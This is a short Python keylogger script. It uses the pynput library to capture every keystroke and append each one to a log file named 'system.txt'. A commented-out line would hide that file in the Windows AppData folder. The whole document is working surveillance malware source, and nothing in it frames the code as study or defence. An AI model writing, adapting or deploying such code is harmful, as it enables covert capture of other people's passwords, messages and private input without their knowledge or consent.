import os
from pynput.keyboard import Listener

keys = []
count = 0
#path = os.environ['appdata'] +'\\system.txt'
path = 'system.txt'

def keystrokes(key):
	global keys, count

	keys.append(key)
	count += 1

	if count >= 1:
		count = 0
		write_file(keys)
		keys = []

def write_file(keys):
	with open(path, 'a') as f:
		for key in keys:
			f.write(str(key))


with Listener(on_press=keystrokes) as listener:
	listener.join()
